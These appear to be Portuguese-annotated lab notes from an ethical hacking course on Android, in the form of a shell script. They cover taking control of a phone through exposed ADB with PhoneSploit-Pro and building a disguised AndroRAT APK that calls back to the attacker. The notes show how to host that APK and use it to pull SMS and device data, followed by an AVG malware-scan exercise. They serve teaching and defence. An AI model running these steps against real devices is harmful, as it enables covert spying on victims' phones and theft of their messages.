#!/bin/bash



###############
# MOD 17 - Lab 1: Hack android devices
###############

########
# TASK 1: Exploit the Android platform through ADB using PhoneSploit-Pro
########

# Objetivo
#   Explorar dispositivos Android vulneráveis com ADB ativado via TCP usando a ferramenta PhoneSploit-Pro
#   Possibilitar a execução remota de comandos, captura de tela, acesso a shell, abertura de links, listagem de apps, entre outras ações.

# Ferramentas e Ambiente
#   Sistema de ataque: Parrot Security OS
#   Sistema alvo: Android com ADB ativado na porta 5555
#   Ferramenta utilizada: PhoneSploit-Pro (interface para automação de comandos ADB)
#   Conexão usada: IP do Android via TCP (10.10.1.14:5555)

# Abrir terminal e tornar-se root
sudo su
#   Acesso root para controle total da ferramenta e comandos ADB.
#   Senha: toor (padrão do Parrot OS em labs)

# Acessar o diretório do PhoneSploit-Pro
cd PhoneSploit-Pro
#   Pasta onde o repositório da ferramenta foi clonado.

# Executar o script principal
python3 phonesploitpro.py
#   Inicia a interface interativa da ferramenta.

# Confirmar acesso ao menu principal
Do you still want to continue to PhoneSploit Pro? Y

# Conectar ao dispositivo Android (via ADB)
[Main Menu] → 1. Connect a Device
#   Digitar o IP: 10.10.1.14
#   Estabelece conexão com o ADB do Android via porta 5555.

# Capturar screenshot do dispositivo
[Main Menu] → 6. Get Screenshot
#   Local de salvamento sugerido: /home/attacker/Desktop
#   Captura e salva imagem da tela atual do dispositivo Android.

# Listar todos os pacotes instalados
[Main Menu] → 13. List Installed Apps → 2. List all packages
#   Exibe todos os pacotes de apps instalados no Android.
#   Útil para identificar nomes de pacotes para executar ou remover apps.

# Executar um aplicativo do Android remotamente
[Main Menu] → 10. Run an App → 2. Enter Package Name Manually
#   Exemplo: com.android.calculator2 (abre a calculadora)
#   Executa o app escolhido diretamente no dispositivo.

# Acessar o shell do Android remotamente
[Main Menu] → 14. Access Device Shell
#   Dentro do shell:
pwd           # Mostra o diretório atual
ls            # Lista arquivos e pastas
cd sdcard     # Acessa armazenamento externo
cd Download   # Acessa pasta de downloads
ls            # Lista os arquivos (ex: images.jpeg)

# Sair do shell e voltar ao menu principal
exit

# Abrir um link remoto no navegador do Android
[Main Menu] → 23. Open a Link on Device
#   Exemplo de link: https://pranx.com/hacker/
#   Abre diretamente no navegador do Android (ex: Chrome)

# Obter informações detalhadas do dispositivo
[Main Menu] → 27. Get Device Information
#   Retorna nome do dispositivo, modelo, versão, fabricante, etc.

# Outras opções disponíveis (não executadas, mas listadas no menu):
#   Screen record a phone
#   Pull a file from device (ex: baixar arquivos como o images.jpeg)
#   Push a file to device
#   Install APK file
#   Uninstall an App
#   Lock the Device
#   Reboot the Device
#   Turn Off the Device
#   Send a message to phone screen
#   Delete all photos/videos
#   Start screen streaming
#   List all connected devices
#   Enable Wi-Fi / Mobile data
#   Take front camera picture

# Considerações Éticas e Técnicas
#   Este laboratório demonstra exploração controlada e ética.
#   Em ambientes reais, ADB habilitado via TCP é uma falha crítica de segurança.
#   Ferramentas como PhoneSploit-Pro exploram má configuração e falta de autenticação no ADB.
#   Recomendado: sempre desabilitar o ADB via rede e usar firewalls para bloquear portas como a 5555.


########
# TASK 2: Hack an Android Device by Creating APK File using AndroRAT
########

# Configuração e Preparação
#   Ambiente: Parrot Security Machine
sudo su
#   Obtém privilégios de root (senha: toor).
cd AndroRAT
#   Navega até o diretório onde o AndroRAT foi clonado.

# Geração do APK malicioso
#   Comando para criar APK:
python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
#   Explicação dos parâmetros:
#       --build	    Indica que é para construir o APK
#       -i	        IP do atacante (Parrot)
#       -p	        Porta a ser usada (4444)
#       -o	        Nome do arquivo de saída (APK malicioso)
#   O APK gerado fica salvo em:
/home/attacker/AndroRAT/SecurityUpdate.apk

# Distribuição do APK via Web Server
#   Copiando para a pasta pública:
cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/
#   Caso a pasta share não exista:
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
#   Isso garante que o Apache possa servir o arquivo corretamente.

# Iniciando o servidor Apache:
service apache2 start
#   Iniciando Listener para esperar a conexão do alvo
python3 androRAT.py --shell -i 0.0.0.0 -p 4444
#   Parâmetros:
#       --shell	        Inicia o interpretador remoto
#       -i 0.0.0.0	    Escuta em todas as interfaces
#       -p 4444	        Porta usada para escutar conexões

# Ações no Android Emulator (Vítima)
#   Abrir o navegador Chrome
#   Acessar a URL:
http://10.10.1.13/share
#   Baixar o arquivo SecurityUpdate.apk
#   Instalar manualmente o APK:
#       Ignorar avisos do Play Protect.
#       Clicar em "Instalar mesmo assim".
#       Permitir instalação de fontes desconhecidas, se necessário.
#   Obs: O app é executado automaticamente em background, sem alertar a vítima.

# Sessão de Controle Ativa via AndroRAT
#   Após a instalação, a vítima se conecta automaticamente ao servidor. No Parrot:
#   Interface interativa do AndroRAT é iniciada.

# Comandos dentro da sessão da AndroRAT
#   Lista todos os comandos disponíveis.
help
#   Exibe informações do dispositivo da vítima (modelo, fabricante, versão do Android etc).
deviceInfo
#   Extrai os SMS da caixa de entrada e salva em:
getSMS inbox
#   Obtém o endereço MAC do dispositivo.
/home/attacker/AndroRAT/Dumps
getMACAddress
#   Encerra a sessão com o dispositivo da vítima.
exit

# Possíveis Comandos Extras no Help do AndroRAT (varia conforme versão)
#   getLocation	        Pega localização atual via GPS
#   getCallLogs	        Pega histórico de chamadas
#   getContacts	        Extrai lista de contatos
#   getWiFiList	        Lista redes Wi-Fi disponíveis
#   getPhoto	        Captura uma foto com a câmera
#   recordAudio	        Gravação de áudio ambiente
#   getClipboard	    Extrai conteúdo da área de transferência

# Considerações Finais
#   Esse tipo de ataque simula o comportamento de muitos malwares reais Android.
#   Serve como estudo de engenharia reversa, engenharia social e pentest móvel.
#   Em ambientes reais, o APK pode ser mascarado como apps legítimos: atualizações, jogos, antivírus etc.
#   Também pode ser distribuído via phishing, QR codes ou campanhas maliciosas.



###############
# MOD 17 - Lab 2: Secure Android Devices using Various Android Security Tools
###############

########
# TASK 1: Secure Android devices from malicious apps using AVG
########


# Objetivo
#   Realizar uma varredura de segurança e eliminar apps maliciosos utilizando o AVG AntiVirus & Security
#   Reforçar a segurança do dispositivo Android contra:
#       Vírus e trojans
#       Spywares e backdoors
#       Acessos não autorizados
#       Apps com permissões excessivas

# Contexto
#   O Android é altamente vulnerável devido à sua popularidade. O AVG permite:
#       App Lock	        Trava apps com senha
#       Photo Vault	        Protege fotos privadas
#       Wi-Fi Security      Scan	Verifica segurança de redes Wi-Fi
#       Hack Alerts	        Alerta se seus dados foram vazados
#       Malware Scan	    Detecta e remove malwares, trojans e backdoors
#       App Permissions     Advisor	Mostra apps com permissões perigosas

# Reiniciar a Máquina Android
#   Navegue até:
Commands (ícone no topo) → Power and Display → Reset/Reboot machine
#   Clique em Yes se aparecer um pop-up de confirmação.

# Abrir o AVG AntiVirus
#   Swipe up (arraste para cima) na tela inicial
#   Clique no ícone do AVG AntiVirus

# Iniciar o AVG AntiVirus
#   Bem-vindo ao AVG	                Clique em GET STARTED
#   Tela de upgrade	                    Clique em SKIP (canto superior direito)
#   Oferecimento do plano Ultimate	    Clique em **Continue with Ads

# Executar Varredura
#   Clique em START SCAN
#   Durante o processo:
#       You are protected with AVG	                    Clique em Continue with Ads
#       Permission required	                            Clique em OK
#       Permissão do sistema (acesso a arquivos)	    Clique em Allow
#   O AVG inicia a varredura de segurança automaticamente.

# Resolver Ameaças Detectadas
#   Se forem detectados malwares:
#       Ex: /storage/emulated/0/Download/Backdoor.apk	Clique em REMOVE
#       Alerta Malware Detected	Clique em REMOVE novamente
#       Pop-up MainActivity	Clique em OK para desinstalar o app

# Tratar Alertas Restantes
#   Após a remoção dos malwares principais:
#       Clique nos três pontinhos (ellipsis) → Ignore para ignorar alertas restantes irrelevantes ou sem risco.

# Finalizar
#   Após a mensagem Scan finished, clique no "X" no canto superior esquerdo para sair.


# Ferramentas Alternativas Recomendadas
#   Além do AVG, o laboratório menciona outras ferramentas de segurança úteis para Android:
#       Certo: Anti Spyware & Security
https://play.google.com	
#       Anti Spy Detector - Spyware
https://play.google.com	
#       iAmNotified - Anti Spy System
https://iamnotified.com
#       Anti Spy	ProtectStar
https://www.protectstar.com
#       Secury - Anti Spy Security	
https://apps.apple.com
